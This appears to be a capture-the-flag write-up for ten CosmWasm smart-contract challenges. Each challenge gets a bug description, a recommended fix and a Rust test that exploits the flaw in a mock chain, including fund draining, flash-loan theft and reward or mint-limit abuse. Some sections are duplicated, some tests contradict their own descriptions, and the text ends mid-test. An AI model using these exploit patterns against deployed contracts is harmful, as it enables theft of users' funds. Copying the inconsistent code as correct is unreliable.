# Report for Oak CTF contest for AwesomeWasm 2023

## Challenge 01: _Mjolnir_

### Description

There is a significant accounting / balance discrepancy vulnerability in the withdrawal function, specifically in the "withdraw" function in the "contract.rs" file. This function does not dedupe lockup ids when withdrawing, leading to a vulnerability of calling multiple duplicate ids to drain the contract balance.

Here is the relevant code:

```rust
pub fn withdraw(deps: DepsMut, env: Env, info: MessageInfo, ids: Vec<u64>,) -> Result<Response, ContractError> {
    // ...
    for lockup in lockups {
        if lockup.owner != info.sender || env.block.time < lockup.release_timestamp {
            return Err(ContractError::Unauthorized { });
        }
        total_amount += lockup.amount;
        LOCKUPS.remove(deps.storage, lockup.id);
    }
    // ...
}
```

The for loop `for lockup in lockups` is intended to iterate different lockup ids. However, it does not dedupe in the case of duplicate lockup ids. So if the same lockup id is passed multiple times, the contract can be drained.

### Recommendation

To fix this issue, you can either only withdraw 1 id per message, or dedupe the ids vec. Here's an example of deduping the ids vec:

```rust
pub fn withdraw(deps: DepsMut, env: Env, info: MessageInfo, ids: Vec<u64>,) -> Result<Response, ContractError> {
    // ...
    let mut ids = ids;
    ids.sort();
    ids.dedup();

    for lockup_id in ids.clone().into_iter() {
    // ...
}
```

With this fix, the contract will only withdraw 1 time per lockup id.

### Proof of concept

```rust
#[test]
fn test_withdraw_accounting() {
    let (mut app, contract_addr) = proper_instantiate();

    let hacker = Addr::unchecked(HACKER.to_string());

    // mint funds to hacker
    app = mint_tokens(app, hacker.to_string(), MINIMUM_DEPOSIT_AMOUNT);

    // deposit
    let msg = ExecuteMsg::Deposit {};
    app.execute_contract(
        hacker.clone(),
        contract_addr.clone(),
        &msg,
        &[coin(MINIMUM_DEPOSIT_AMOUNT.u128(), DENOM)],
    )
    .unwrap();

    let msg = QueryMsg::GetLockup { id: 2 };
    let lockup: Lockup = app
        .wrap()
        .query_wasm_smart(contract_addr.clone(), &msg)
        .unwrap();
    assert_eq!(lockup.amount, MINIMUM_DEPOSIT_AMOUNT);
    assert_eq!(lockup.owner, hacker);

    // fast forward to LOCK_PERIOD
    app.update_block(|block| {
        block.time = block.time.plus_seconds(LOCK_PERIOD);
    });

    // "hacker" tries to drain contract
    let msg = ExecuteMsg::Withdraw {
        ids: vec![2, 2, 2, 2, 2, 2, 2, 2, 2, 2],
    };
    let res = app.execute_contract(hacker.clone(), contract_addr.clone(), &msg, &[]);
    assert!(res.is_ok());

    // verify funds received should match deposit amount
    let balance = app.wrap().query_balance(hacker, DENOM).unwrap().amount;
    assert_eq!(balance, MINIMUM_DEPOSIT_AMOUNT);
}
```

---

## Challenge 02: _Gungnir_

### Description

The `total_tokens` variable is updated when a deposit or withdrawal occurs but not when staking or unstaking. As a result, this might cause an accounting / balance discrepancy between the `total_tokens` and `voting_power`.

Suppose a user has 50 tokens and they decide to stake 50 tokens. Now, they have 50 `voting_power` and 50 `total_tokens`. Now, let's say the user withdraws 50 tokens. As per the code, the `voting_power` will be 50 but the `total_tokens` will be 0. The remaining voting power despite having no tokens can result in a discrepancy.

### Recommendation

This exploit can be resolved by adjusting the `total_tokens` whenever a user stakes or unstakes. The stake function should decrease `total_tokens` by `lock_amount` and the unstake function should increase `total_tokens` by `unlock_amount`. This would ensure that `total_tokens` always reflects the actual number of unstaked tokens a user has and prevent any possible discrepancy.

```rust
pub fn stake(
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    lock_amount: u128,
) -> Result<Response, ContractError> {
    // increase voting power
    let mut user = VOTING_POWER.load(deps.storage, &info.sender).unwrap();

    user.voting_power += lock_amount;
    user.total_tokens -= lock_amount;

    // ...
}

pub fn unstake(deps: DepsMut,
    env: Env,
    info: MessageInfo,
    unlock_amount: u128,
) -> Result<Response, ContractError> {
    // decrease voting power
    let mut user = VOTING_POWER.load(deps.storage, &info.sender).unwrap();

    // check release time
    if env.block.time < user.released_time {
        return Err(ContractError::Unauthorized {});
    }

    user.voting_power -= unlock_amount;
    user.total_tokens += unlock_amount;

    // ...
}

```

### Proof of concept

```rust
#[test]
fn test_withdraw_accounting() {
    let (mut app, contract_addr) = proper_instantiate();

    let amount = Uint128::new(50);

    app = mint_tokens(app, HACKER.to_string(), amount);
    let hacker = Addr::unchecked(HACKER);

    // deposit 50 funds for hacker
    let msg = ExecuteMsg::Deposit {};
    app.execute_contract(
        hacker.clone(),
        contract_addr.clone(),
        &msg,
        &[coin(amount.u128(), DENOM)],
    )
    .unwrap();

    // The hacker stakes 50 tokens
    app.execute_contract(
        hacker.clone(),
        contract_addr.clone(),
        &ExecuteMsg::Stake { lock_amount: 50 },
        &[],
    )
    .unwrap();

    // The hacker withdraws 50 tokens
    // This should fail because the hacker should not be able to withdraw staked tokens
    app.execute_contract(
        hacker.clone(),
        contract_addr.clone(),
        &ExecuteMsg::Withdraw {
            amount: Uint128::from(50u128),
        },
        &[],
    )
    .unwrap_err();

    // Should be 0 voting power, but it is 50 voting power
    let msg = QueryMsg::GetVotingPower {
        user: (&HACKER).to_string(),
    };
    let voting_power: u128 = app
        .wrap()
        .query_wasm_smart(contract_addr.clone(), &msg)
        .unwrap();
    assert_neq!(voting_power, 50_u128);
}
```

---

## Challenge 03: _Laevateinn_

### Description

The bug is within the interaction between the Proxy and Flash Loan contract. Specifically, the Flash Loan contract does not verify that the funds returned to it in settle_loan actually came from the Proxy contract.

Here is the flow of the exploit:

1. An unprivileged user sends a `RequestFlashLoan` to the Proxy contract, specifying the `Arb` contract as the recipient and an `Arb` action as the message.
2. The Proxy contract sends the entire balance of the Flash Loan contract to the Arb contract.
3. The Arb contract, instead of returning the funds to the Flash Loan contract, sends them to an arbitrary account.
4. The Proxy contract then attempts to call settle_loan on the Flash Loan contract. However, the Flash Loan contract only checks that the function was called by the Proxy contract, not that the funds are actually present.

### Recommendation

Given the nature of the vulnerability, where a flash loan can be exploited by sending funds to an arbitrary account instead of back to the contract that issued the loan, a key fix would be to verify the source of the returned funds. The `SettleLoan` function must not just check if it was called by the proxy, but also ensure that the contract balance equals or exceeds the loan amount.

### Proof of concept

```rust
// add to proxy integration tests
#[test]
fn settle_loan_vulnerability() {
let (mut app, proxy_contract, flash_loan_contract, mock_arb_contract) =
proper_instantiate();
let hacker = Addr::unchecked(HACKER.to_string());

        // prepare arb msg sending funds to hacker
        let arb_msg = to_binary(&MockArbExecuteMsg::Arbitrage {
            recipient: hacker.clone(),
        })
        .unwrap();

        // Request a flash loan with the Arb contract as the recipient
        app.execute_contract(
            proxy_contract.clone(),
            flash_loan_contract.clone(),
            &ExecuteMsg::RequestFlashLoan {
                recipient: mock_arb_contract.clone(),
                msg: arb_msg.clone(),
            },
            &[],
        )
        .unwrap();

        // Check that the funds have been drained to the hacker address
        let balance = app.wrap().query_balance(hacker, DENOM).unwrap();
        assert_eq!(balance.amount, Uint128::new(10_000));

        // Try to settle the loan, which should fail
        let res = app.execute_contract(
            proxy_contract.clone(),
            flash_loan_contract.clone(),
            &FlashLoanExecuteMsg::SettleLoan {},
            &[],
        );

        // Check if the result is an error
        assert!(res.is_err(), "Settled loan without returning funds");

        // The Flash Loan contract's balance should be zero after the attempted settlement
        let balance = app
            .wrap()
            .query_balance(flash_loan_contract.to_string(), DENOM)
            .unwrap();
        assert_eq!(balance.amount, Uint128::zero());
    }
```

---

## Challenge 04: _Gram_

### Description

There is a vulnerability in the mint function. The vulnerability is related to how the `mint_amount` is calculated. This issue could potentially allow a user to withdraw more funds than they deposited.

Let's consider the following steps:

1. User A deposits 1000 uawesome, since the total supply is 0, they receive 1000 shares.
2. User A burns all their shares and withdraws 1000 uawesome.
3. Now the total supply is 0 but the contract still has 1000 uawesome left because of the burning process.
4. User B deposits 1 uawesome, they should receive 1 share, but due to the current implementation of the mint method, they receive 1001 shares because the minting ratio is calculated based on the total assets left by user A (1000 uawesome) and the current deposit (1 uawesome).
5. User B burns all their shares and theoretically they should receive only 1 uawesome, the amount they deposited. However, the current implementation of the burn method allows them to withdraw all the coins in the contract (1001 uawesome), which is more than they initially deposited.

The vulnerability arises from the fact that when a user burns their shares, their coins aren't burned as well, so they are left in the contract. This allows a user who deposits later to potentially mint more shares than they should and consequently withdraw more coins than they deposited.

### Recommendation

To fix this, you should adjust the burn method to also burn/withdraw the corresponding amount of coins from the contract. For example:

```rust
let mut user = BALANCES.load(deps.storage, &info.sender)?;
user.amount -= shares;
BALANCES.save(deps.storage, &info.sender, &user)?;

let remaining_asset = contract_balance.amount - asset_to_return;
deps.querier.update_balance(env.contract.address.to_string(), coins(remaining_asset.u128(), DENOM));

let msg = BankMsg::Send {
    to_address: info.sender.to_string(),
    amount: coins(asset_to_return.u128(), DENOM),
};
```

### Proof of concept

```rust
#[test]
    fn test_imbalance() {
        let (mut app, contract_addr) = proper_instantiate();

        // User A deposits 10000 uawesome, since the total supply is 0, they receive 10000 shares.
        // mint funds to user
        app = mint_tokens(app, USER.to_owned(), Uint128::new(10_000));

        // mint shares for user
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // User A burns all their shares and withdraws 10000 uawesome.
        // Now the total supply is 0 but the contract still has 10000 uawesome left because of the burning process.
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Burn {
                shares: Uint128::new(10_000),
            },
            &[],
        )
        .unwrap();

        // User B deposits 1 uawesome, they should receive 1 share, but due to the current implementation of the mint method, they receive 10001 shares because the minting ratio is calculated based on the total assets left by user A (10000 uawesome) and the current deposit (1 uawesome).
        // mint funds to user2
        app = mint_tokens(app, USER2.to_owned(), Uint128::new(1));

        // mint shares for user2
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[coin(1, DENOM)],
        )
        .unwrap();

        // burn shares for user2
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Burn {
                shares: Uint128::new(1),
            },
            &[],
        )
        .unwrap();

        // query user2
        let balance: Balance = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::UserBalance {
                    address: USER2.to_string(),
                },
            )
            .unwrap();
        assert_eq!(balance.amount, Uint128::new(0));

        let bal = app.wrap().query_balance(USER2, DENOM).unwrap();
        assert_eq!(bal.amount, Uint128::new(1));

        let bal = app
            .wrap()
            .query_balance(contract_addr.to_string(), DENOM)
            .unwrap();
        assert_eq!(bal.amount, Uint128::zero());
    }
```

---

## Challenge 05: _Draupnir_

The contract does have a critical flaw in the `OwnerAction` function which allows the contract owner to execute arbitrary Cosmos messages, potentially manipulating the contract's state or performing malicious actions in the context of the contract.

Here's how the owner can drain all the funds:

The contract owner waits for users to deposit a significant amount of `uawesome` tokens into the contract.
The owner uses the `OwnerAction` function to send a `BankMsg::Send` message, transferring all the contract's balance to their own account or another account of their choice.
This action is not technically a vulnerability, since it's a feature of the contract that's available only to the owner. However, it's a risky design that could lead to misuse or abuse of the contract's funds. It's generally considered bad practice to include such powerful capabilities in a smart contract without additional safeguards or restrictions.

To mitigate this risk, consider restricting the types of messages that the owner can send or implementing additional checks and balances on the owner's actions. For example, you could require a certain period of time to pass or a certain number of users to approve before the owner can execute a Cosmos message.

### Recommendation

Restrict Owner Actions: Limit the types of Cosmos messages that the owner can send. This could be done by creating a whitelist of allowed actions, and checking any proposed actions against this list before execution. This would prevent the owner from performing potentially harmful actions like transferring out all of the contract's funds.

```rust
pub fn owner_action(deps: DepsMut, info: MessageInfo, msg: CosmosMsg) -> Result<Response, ContractError> {
    assert_owner(deps.storage, info.sender)?;
    // Add a check to make sure the msg is of a type that we want to allow
    match &msg {
        CosmosMsg::Bank(BankMsg::Send { .. }) => {
            // disallow BankMsg::Send
            return Err(ContractError::Unauthorized {});
        }
        // Add more match arms to disallow other types of messages
        _ => {}
    }
    Ok(Response::new().add_attribute("action", "owner_action").add_message(msg))
}
```

Implement Approval Mechanism: Implement a mechanism where a certain number of users, or a certain fraction of users, need to approve an action before it can be executed. This could be done using a multi-signature approach, where several trusted parties need to approve a transaction before it can be executed.

```rust
pub fn owner_action(deps: DepsMut, info: MessageInfo, msg: CosmosMsg, approvers: Vec<String>) -> Result<Response, ContractError> {
    assert_owner(deps.storage, info.sender)?;
    // Check that enough approvers have signed off on this action
    if approvers.len() < MINIMUM_APPROVALS {
        return Err(ContractError::Unauthorized {});
    }
    Ok(Response::new().add_attribute("action", "owner_action").add_message(msg))
}
```

Time Locks: Add a delay between when an action is proposed and when it can be executed. This gives users a chance to review proposed actions and potentially stop them if they are malicious.

```rust
    pub fn propose_action(deps: DepsMut, info: MessageInfo, msg: CosmosMsg) -> Result<Response, ContractError> {
    assert_owner(deps.storage, info.sender)?;
    // Store the proposed action and the time it was proposed
    PROPOSED_ACTIONS.save(deps.storage, &ProposedAction {
        msg,
        time_proposed: env.block.time,
    })?;
    Ok(Response::new().add_attribute("action", "propose_action"))
}

pub fn execute_action(deps: DepsMut, info: MessageInfo) -> Result<Response, ContractError> {
assert_owner(deps.storage, info.sender)?;
// Load the proposed action and check that enough time has passed
let proposed_action = PROPOSED_ACTIONS.load(deps.storage)?;
if env.block.time - proposed_action.time_proposed < ACTION_DELAY {
return Err(ContractError::Unauthorized {});
}
// Execute the action
Ok(Response::new().add_attribute("action", "execute_action").add_message(proposed_action.msg))
}
```

### Proof of concept

Here's how the contract owner could potentially drain all the funds:

```rust
#[test]
    fn test_owner_drain() {
        let (mut app, contract_addr) = proper_instantiate();

        // Initial state
        let state: State = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::State {})
            .unwrap();

        assert_eq!(
            state,
            State {
                current_owner: Addr::unchecked(ADMIN),
                proposed_owner: None,
            }
        );

        // Ownership transfer
        app.execute_contract(
            Addr::unchecked(ADMIN),
            contract_addr.clone(),
            &ExecuteMsg::ProposeNewOwner {
                new_owner: "new_owner".to_string(),
            },
            &[],
        )
        .unwrap();

        app.execute_contract(
            Addr::unchecked("new_owner"),
            contract_addr.clone(),
            &ExecuteMsg::AcceptOwnership {},
            &[],
        )
        .unwrap();

        // Final state
        let state: State = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::State {})
            .unwrap();

        assert_eq!(
            state,
            State {
                current_owner: Addr::unchecked("new_owner"),
                proposed_owner: None,
            }
        );

        // User 1 deposit
        app = mint_tokens(app, USER1.to_owned(), Uint128::new(10_000));
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // User 2 deposit
        app = mint_tokens(app, USER2.to_owned(), Uint128::new(10_000));
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        let withdraw_msg = BankMsg::Send {
            to_address: ADMIN.to_string(),
            amount: vec![coin(20_000, DENOM)],
        };

        app.execute_contract(
            Addr::unchecked("new_owner"),
            contract_addr,
            &ExecuteMsg::OwnerAction {
                msg: CosmosMsg::Bank(withdraw_msg),
            },
            &[],
        )
        .unwrap();
    }
```

Remember, this is just a demonstration of how the owner of the contract can drain the contract. This action might be considered malicious in a real-world scenario and it's generally not a good practice to have such powerful capabilities in a smart contract.

---

## Challenge 06: _Hofund_

### Description

Balance is not reset, so when a proposal fails, the balance of the proposal is not returned.

### Recommendation

To fix this issue, reset the balance on proposal failures.

```rust
if balance.balance >= (vtoken_info.total_supply / Uint128::from(3u32)) {
    CONFIG.update(deps.storage, |mut config| -> StdResult<_> {
        config.owner = current_proposal.proposer;
        Ok(config)
    })?;
    response = response.add_attribute("result", "Passed");
} else {
    PROPOSAL.remove(deps.storage);
    response = response.add_attribute("result", "Failed");
}
// reset tokens here
```

### Proof of concept

```rust
#[test]
    fn test_vulnerability() {
        let (mut app, contract_addr, token_addr) = proper_instantiate();

        // User1 propose themselves
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Propose {},
            &[],
        )
        .unwrap();

        // cannot propose second time
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Propose {},
            &[],
        )
        .unwrap_err();

        // Admin votes, simulates msg from CW20 contract
        let msg = to_binary(&Cw20HookMsg::CastVote {}).unwrap();
        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr.clone(),
            &Cw20ExecuteMsg::Send {
                contract: contract_addr.to_string(),
                msg,
                amount: Uint128::new(30_000),
            },
            &[],
        )
        .unwrap();

        // fast forward 24 hrs
        app.update_block(|block| {
            block.time = block.time.plus_seconds(VOTING_WINDOW);
        });

        // User1 ends proposal
        let result = app
            .execute_contract(
                Addr::unchecked(USER1),
                contract_addr.clone(),
                &ExecuteMsg::ResolveProposal {},
                &[],
            )
            .unwrap();

        assert_eq!(result.events[1].attributes[2], attr("result", "Failed"));

        // Check ownership transfer
        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
            .unwrap();
        assert_eq!(config.owner, ADMIN.to_string());

        // User2 propose themselves
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Propose {},
            &[],
        )
        .unwrap();

        // Admin votes, simulates msg from CW20 contract
        let msg = to_binary(&Cw20HookMsg::CastVote {}).unwrap();
        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr,
            &Cw20ExecuteMsg::Send {
                contract: contract_addr.to_string(),
                msg,
                amount: Uint128::new(30_000),
            },
            &[],
        )
        .unwrap();

        // fast forward 24 hrs
        app.update_block(|block| {
            block.time = block.time.plus_seconds(VOTING_WINDOW);
        });

        // User1 ends proposal
        let result = app
            .execute_contract(
                Addr::unchecked(USER2),
                contract_addr.clone(),
                &ExecuteMsg::ResolveProposal {},
                &[],
            )
            .unwrap();

        assert_eq!(result.events[1].attributes[2], attr("result", "Passed"));

        // Check ownership transfer
        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr, &QueryMsg::Config {})
            .unwrap();
        assert_eq!(config.owner, USER2.to_string());
    }
```

---

## Challenge 07: _Tyrfing_

The contract does have a critical flaw in the `OwnerAction` function which allows the contract owner to execute arbitrary Cosmos messages, potentially manipulating the contract's state or performing malicious actions in the context of the contract.

Here's how the owner can drain all the funds:

The contract owner waits for users to deposit a significant amount of `uawesome` tokens into the contract.
The owner uses the `OwnerAction` function to send a `BankMsg::Send` message, transferring all the contract's balance to their own account or another account of their choice.
This action is not technically a vulnerability, since it's a feature of the contract that's available only to the owner. However, it's a risky design that could lead to misuse or abuse of the contract's funds. It's generally considered bad practice to include such powerful capabilities in a smart contract without additional safeguards or restrictions.

To mitigate this risk, consider restricting the types of messages that the owner can send or implementing additional checks and balances on the owner's actions. For example, you could require a certain period of time to pass or a certain number of users to approve before the owner can execute a Cosmos message.

### Recommendation

Restrict Owner Actions: Limit the types of Cosmos messages that the owner can send. This could be done by creating a whitelist of allowed actions, and checking any proposed actions against this list before execution. This would prevent the owner from performing potentially harmful actions like transferring out all of the contract's funds.

```rust
pub fn owner_action(deps: DepsMut, info: MessageInfo, msg: CosmosMsg) -> Result<Response, ContractError> {
    assert_owner(deps.storage, info.sender)?;
    // Add a check to make sure the msg is of a type that we want to allow
    match &msg {
        CosmosMsg::Bank(BankMsg::Send { .. }) => {
            // disallow BankMsg::Send
            return Err(ContractError::Unauthorized {});
        }
        // Add more match arms to disallow other types of messages
        _ => {}
    }
    Ok(Response::new().add_attribute("action", "owner_action").add_message(msg))
}
```

Implement Approval Mechanism: Implement a mechanism where a certain number of users, or a certain fraction of users, need to approve an action before it can be executed. This could be done using a multi-signature approach, where several trusted parties need to approve a transaction before it can be executed.

```rust
pub fn owner_action(deps: DepsMut, info: MessageInfo, msg: CosmosMsg, approvers: Vec<String>) -> Result<Response, ContractError> {
    assert_owner(deps.storage, info.sender)?;
    // Check that enough approvers have signed off on this action
    if approvers.len() < MINIMUM_APPROVALS {
        return Err(ContractError::Unauthorized {});
    }
    Ok(Response::new().add_attribute("action", "owner_action").add_message(msg))
}
```

Time Locks: Add a delay between when an action is proposed and when it can be executed. This gives users a chance to review proposed actions and potentially stop them if they are malicious.

```rust
    pub fn propose_action(deps: DepsMut, info: MessageInfo, msg: CosmosMsg) -> Result<Response, ContractError> {
    assert_owner(deps.storage, info.sender)?;
    // Store the proposed action and the time it was proposed
    PROPOSED_ACTIONS.save(deps.storage, &ProposedAction {
        msg,
        time_proposed: env.block.time,
    })?;
    Ok(Response::new().add_attribute("action", "propose_action"))
}

pub fn execute_action(deps: DepsMut, info: MessageInfo) -> Result<Response, ContractError> {
assert_owner(deps.storage, info.sender)?;
// Load the proposed action and check that enough time has passed
let proposed_action = PROPOSED_ACTIONS.load(deps.storage)?;
if env.block.time - proposed_action.time_proposed < ACTION_DELAY {
return Err(ContractError::Unauthorized {});
}
// Execute the action
Ok(Response::new().add_attribute("action", "execute_action").add_message(proposed_action.msg))
}
```

### Proof of concept

Here's how the contract owner could potentially drain all the funds:

```rust
#[test]
fn test_drain() {
    let (mut app, contract_addr) = proper_instantiate();

    let bal = app.wrap().query_balance(USER1, DENOM).unwrap();
    assert_eq!(bal.amount, Uint128::new(100));

    // User 1 deposit
    app.execute_contract(
        Addr::unchecked(USER1),
        contract_addr.clone(),
        &ExecuteMsg::Deposit {},
        &[coin(100, DENOM)],
    )
    .unwrap();

    let bal = app.wrap().query_balance(USER1, DENOM).unwrap();
    assert_eq!(bal.amount, Uint128::zero());

    // Step 2: Owner uses the `OwnerAction` function to send a `BankMsg::Send` message,
    // transferring all the contract's balance to their own account

    let withdraw_msg = BankMsg::Send {
        to_address: ADMIN.to_string(),
        amount: vec![coin(1_000_000, DENOM)],
    };

    app.execute_contract(
        Addr::unchecked(ADMIN),
        contract_addr,
        &ExecuteMsg::OwnerAction {
            msg: CosmosMsg::Bank(withdraw_msg),
        },
        &[],
    )
    .unwrap();
}
```

Remember, this is just a demonstration of how the owner of the contract can drain the contract. This action might be considered malicious in a real-world scenario and it's generally not a good practice to have such powerful capabilities in a smart contract.

---

## Challenge 08: _Gjallarhorn_

### Description

It appears that when a trade is accepted, the exec_accept_trade function deletes the trade record but does not remove the corresponding sale record.

Here's how the exploit could work:

1. Bob offers to trade one of his NFTs (NFT2) for Alice's NFT1.
2. Alice lists an NFT (NFT1) for sale and marks it as tradable.
3. Alice accepts the trade. NFT1 is transferred to Bob, and NFT2 is transferred to Alice. The trade record is removed.
4. However, the sale record for NFT1 is still in place, and the sale owner is Alice.
5. Alice buys the NFT, transferring NFT1 back to herself and transferring funds back to herself.

### Recommendation

To prevent this, the `exec_accept_trade` function should remove both `TRADES` and `SALES`. Additionally, the contract should verify the NFT owner before transferring.

### Proof of concept

Here is an example of how a malicious attacker may exploit this vulnerability:

```rust
#[test]
    fn trade_exploit() {
        let (mut app, contract_addr, token_addr) = proper_instantiate();

        // Approve to transfer the NFT
        app.execute_contract(
            Addr::unchecked(USER1),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT1.to_string(),
                expires: None,
            },
            &[],
        )
        .unwrap();

        // Approve to transfer the NFT
        app.execute_contract(
            Addr::unchecked(USER2),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT2.to_string(),
                expires: None,
            },
            &[],
        )
        .unwrap();

        // 1. Alice lists an NFT (NFT1) for sale and marks it as tradable.
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::NewSale {
                id: NFT1.to_string(),
                price: Uint128::from(100u128),
                tradable: true,
            },
            &[],
        )
        .unwrap();

        // 2. Bob offers to trade one of his NFTs (NFT2) for Alice's NFT1.
        // Create trade offer
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::NewTrade {
                target: NFT1.to_string(),
                offered: NFT2.to_string(),
            },
            &[],
        )
        .unwrap();

        // 3. Alice accepts the trade. NFT1 is transferred to Bob, and NFT2 is transferred to Alice. The trade record is removed.
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::AcceptTrade {
                id: NFT1.to_string(),
                trader: USER2.to_string(),
            },
            &[],
        )
        .unwrap();

        // 4. However, the sale record for NFT1 is still in place, and the trade owner is Alice.
        let sale_info: Sale = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::GetSale {
                    id: NFT1.to_string(),
                },
            )
            .unwrap();
        assert_eq!(sale_info.owner, USER1.to_string());

        // 5. Charlie tries to buy NFT1, and pays Alice.
        // Approve to transfer the NFT
        app.execute_contract(
            Addr::unchecked(USER2),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT1.to_string(),
                expires: None,
            },
            &[],
        )
        .unwrap();

        app = mint_tokens(app, USER1.to_owned(), sale_info.price);
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::BuyNFT {
                id: NFT1.to_string(),
            },
            &[coin(100u128, DENOM)],
        )
        .unwrap();

        // confirm Alice has NFT2 and funds
        let owner_of: OwnerOfResponse = app
            .wrap()
            .query_wasm_smart(
                token_addr.clone(),
                &Cw721QueryMsg::OwnerOf {
                    token_id: NFT1.to_string(),
                    include_expired: None,
                },
            )
            .unwrap();
        assert_eq!(owner_of.owner, USER1.to_string());
        let owner_of: OwnerOfResponse = app
            .wrap()
            .query_wasm_smart(
                token_addr,
                &Cw721QueryMsg::OwnerOf {
                    token_id: NFT2.to_string(),
                    include_expired: None,
                },
            )
            .unwrap();
        assert_eq!(owner_of.owner, USER1.to_string());
        // confirm balance of USER1
        let balance = app
            .wrap()
            .query_balance(USER1.to_string(), DENOM)
            .unwrap()
            .amount;
        assert_eq!(balance, Uint128::from(100u128));
    }
```

---

## Challenge 09: _Brisingamen_

### Description

User 1 deposits a large amount of tokens. This will set the `global_index` to a certain value since User A is the only one who has staked.

User 1 withdraws all the staked tokens. This does not change the `global_index`, but it reduces User A's staked_amount to zero. However, the user_index for User A is still at the value of the `global_index` when the tokens were deposited.

User 2 deposits a small amount of tokens.

The contract owner increases the rewards.

User 1 deposits tokens again. This does not change the global_index but it increases User A's staked_amount.

User 1 claims their rewards. The reward calculation is `(state.global_index - user.user_index) * user.staked_amount`. The rewards User 1 gets the increased rewards without staking.

This exploit is possible because `user_index` is not updated when all staked tokens are withdrawn.

### Recommendation

Update the `user_index` when all staked tokens are withdrawn.

### Proof of concept

```rust
//
#[test]
    fn test_exploit() {
        let (mut app, contract_addr) = proper_instantiate();

        // user1 withdraws the full amount
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Withdraw {
                amount: Uint128::new(10_000),
            },
            &[],
        )
        .unwrap();

        // query user1 info
        let user_info: UserRewardInfo = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::User {
                    user: USER.to_string(),
                },
            )
            .unwrap();

        assert_eq!(user_info.pending_rewards, Uint128::new(10000));

        // new user2 join
        app = mint_tokens(app, USER2.to_owned(), Uint128::new(10_000));
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // owner increases reward
        app = mint_reward_tokens(app, OWNER.to_owned(), Uint128::new(10_000));
        app.execute_contract(
            Addr::unchecked(OWNER),
            contract_addr.clone(),
            &ExecuteMsg::IncreaseReward {},
            &[coin(10_000, REWARD_DENOM)],
        )
        .unwrap();

        // query user1 info
        let user_info: UserRewardInfo = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::User {
                    user: USER.to_string(),
                },
            )
            .unwrap();

        assert_eq!(user_info.pending_rewards, Uint128::new(10000));

        // User deposits a small amount after the reward increase, without staking
        app = mint_tokens(app, USER.to_owned(), Uint128::new(1));
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000u128, DENOM)],
        )
        .unwrap();

        // query user1 info
        let user_info: UserRewardInfo = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::User {
                    user: USER.to_string(),
                },
            )
            .unwrap();

        assert_eq!(user_info.pending_rewards, Uint128::new(20000));

        // User claims rewards
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::ClaimRewards {},
            &[],
        )
        .unwrap();

        // Check user's balance
        let balance = app
            .wrap()
            .query_balance(USER.to_string(), REWARD_DENOM)
            .unwrap()
            .amount;
        assert_eq!(balance, Uint128::new(20000));
    }

```

---

## Challenge 10: _Mistilteinn_

### Description

A potential vulnerability arises if a whitelisted user transfers their minted tokens to another address after they have been minted. The transferred tokens would no longer be associated with the user's address, so they would not be included in the `Tokens` query results, effectively allowing the user to mint more tokens than the `mint_per_user` limit.

### Recommendation

To mitigate this, the contract could maintain an internal count of the number of tokens minted per user, independent of the number of tokens currently owned by the user. This would prevent users from bypassing the minting limit by transferring tokens. It could use something like `MintCount = Map<&address, mint_count>` and increment `mint_count` on each `mint`.

### Proof of concept

```rust
#[test]
fn exploit_mint_limit() {
    let mut deps = mock_dependencies(&[]);
    let mut app = mock_app();

    // Define the contract address
    let contract_address = "contract".to_string();

    // Define the whitelisted user
    let user = "user".to_string();

    // Define the receiver
    let receiver = "receiver".to_string();

    // Instantiate the contract
    let instantiate_msg = InstantiateMsg { ... };
    let info = mock_info(&user, &[]);
